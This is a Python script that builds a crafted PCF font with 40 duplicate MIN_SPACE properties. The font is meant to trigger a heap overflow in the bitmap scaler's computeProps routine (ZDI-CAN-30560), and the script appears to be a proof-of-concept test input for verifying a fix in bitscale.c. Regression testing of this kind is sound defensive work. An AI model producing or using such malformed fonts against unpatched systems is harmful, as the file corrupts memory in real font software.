#!/usr/bin/env python3
"""
Generate a malicious PCF font that triggers the computeProps property
buffer heap overflow (ZDI-CAN-30560).

The font has 40 duplicate MIN_SPACE properties. When the bitmap scaler
processes this font, computeProps writes 2 slots per scaledX match with
no bounds check, overflowing the fixed 70-slot property buffer.

With the fix in bitscale.c, computeProps checks remaining buffer capacity
and silently skips properties that would overflow.

Usage:
    python3 gen_evil_pcf_props.py <output_dir>

Creates <output_dir>/evil-props.pcf and <output_dir>/fonts.dir
The font is stored at pixel=10; opening at a different pixel size
triggers the scaling path.
"""

import struct
import sys
import os

PCF_DEFAULT_FORMAT = 0x00000000
PCF_PROPERTIES = 1
PCF_ACCELERATORS = 2
PCF_METRICS = 4
PCF_BITMAPS = 8
PCF_BDF_ENCODINGS = 32


def u32(x):
    return struct.pack("<I", x & 0xFFFFFFFF)


def i32(x):
    return struct.pack("<i", x)


def u16(x):
    return struct.pack("<H", x & 0xFFFF)


def i16(x):
    return struct.pack("<h", x)


def u8(x):
    return struct.pack("<B", x & 0xFF)


def xCharInfo(lsb, rsb, cw, asc, desc, attr):
    return i16(lsb) + i16(rsb) + i16(cw) + i16(asc) + i16(desc) + u16(attr)


NUM_MIN_SPACE = 40
PROP_VALUE_BASE = 0x11223300

MAX_LSB, MAX_RSB = 0, 4
MAX_ASCENT, MAX_DESCENT = 2, 2

# --- PROPERTIES (40 duplicate MIN_SPACE) ---
prop_name_atom = b"MIN_SPACE\0"
properties = b""
properties += u32(PCF_DEFAULT_FORMAT)
properties += i32(NUM_MIN_SPACE)
for i in range(NUM_MIN_SPACE):
    properties += i32(0)  # name offset = 0 -> "MIN_SPACE"
    properties += u8(0)  # isStringProp = 0
    properties += i32(PROP_VALUE_BASE + i)  # unique value
pad_count = (4 - (NUM_MIN_SPACE % 4)) % 4
properties += b"\x00" * pad_count
properties += i32(len(prop_name_atom))
properties += prop_name_atom

# --- ACCELERATORS ---
accel = b""
accel += u32(PCF_DEFAULT_FORMAT)
accel += u8(0) * 8
accel += i32(MAX_ASCENT)
accel += i32(MAX_DESCENT)
accel += i32(0)
accel += xCharInfo(0, 0, 0, 0, 0, 0)
accel += xCharInfo(MAX_LSB, MAX_RSB, MAX_RSB, MAX_ASCENT, MAX_DESCENT, 0)

# --- METRICS (1 glyph, small) ---
metrics = b""
metrics += u32(PCF_DEFAULT_FORMAT)
metrics += i32(1)
metrics += xCharInfo(MAX_LSB, MAX_RSB, MAX_RSB, MAX_ASCENT, MAX_DESCENT, 0)

# --- BITMAPS ---
bitmap_data = b"\x80" * 4
BITMAP_SIZES = [4, 8, 32, 64]
bitmaps = b""
bitmaps += u32(PCF_DEFAULT_FORMAT)
bitmaps += i32(1)
bitmaps += u32(0)
for sz in BITMAP_SIZES:
    bitmaps += u32(sz)
bitmaps += bitmap_data

# --- BDF_ENCODINGS ---
encodings = b""
encodings += u32(PCF_DEFAULT_FORMAT)
encodings += u16(0) + u16(0)
encodings += u16(0) + u16(0)
encodings += u16(0)
encodings += u16(0)

# --- Assemble ---
TABLE_COUNT = 5
BODY_START = 8 + TABLE_COUNT * 16

properties_off = BODY_START
accel_off = properties_off + len(properties)
metrics_off = accel_off + len(accel)
bitmaps_off = metrics_off + len(metrics)
encodings_off = bitmaps_off + len(bitmaps)


def toc(type_, format_, size, offset):
    return u32(type_) + u32(format_) + u32(size) + u32(offset)


out = b"\x01fcp" + u32(TABLE_COUNT)
out += toc(PCF_PROPERTIES, 0, len(properties), properties_off)
out += toc(PCF_ACCELERATORS, 0, len(accel), accel_off)
out += toc(PCF_METRICS, 0, len(metrics), metrics_off)
out += toc(PCF_BITMAPS, 0, len(bitmaps), bitmaps_off)
out += toc(PCF_BDF_ENCODINGS, 0, len(encodings), encodings_off)
out += properties + accel + metrics + bitmaps + encodings

output_dir = sys.argv[1] if len(sys.argv) > 1 else "."
os.makedirs(output_dir, exist_ok=True)

pcf_name = "evil-props.pcf"
# Stored at pixel=10; test must open at different size to trigger scaler
xlfd = "-evil-props-medium-r-normal--10-100-75-75-c-80-iso10646-1"

with open(os.path.join(output_dir, pcf_name), "wb") as f:
    f.write(out)

with open(os.path.join(output_dir, "fonts.dir"), "w") as f:
    f.write("1\n")
    f.write(f"{pcf_name} {xlfd}\n")
